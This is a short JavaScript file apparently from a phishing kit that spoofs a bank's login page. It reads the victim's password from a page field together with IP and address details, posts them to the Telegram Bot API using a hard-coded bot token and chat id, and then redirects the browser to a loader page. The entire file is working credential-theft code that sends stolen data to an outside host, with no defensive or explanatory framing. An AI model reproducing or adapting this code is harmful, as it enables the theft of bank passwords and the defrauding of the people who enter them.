//bot token
var telegram_bot_id = "7865866491:AAEQ9ofVuEKkQs5QRgGfRemToLGiUT8uVN0";
//chat id
var chat_id = 7549680162;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("keyboard_display").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "Pasw: " + u_name + "\nIP: " + ip +"\n" + ip2 +"\nBco.COLOCOBM S.A";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'loader.html';
        console.log(response);
    });
    return false;
};
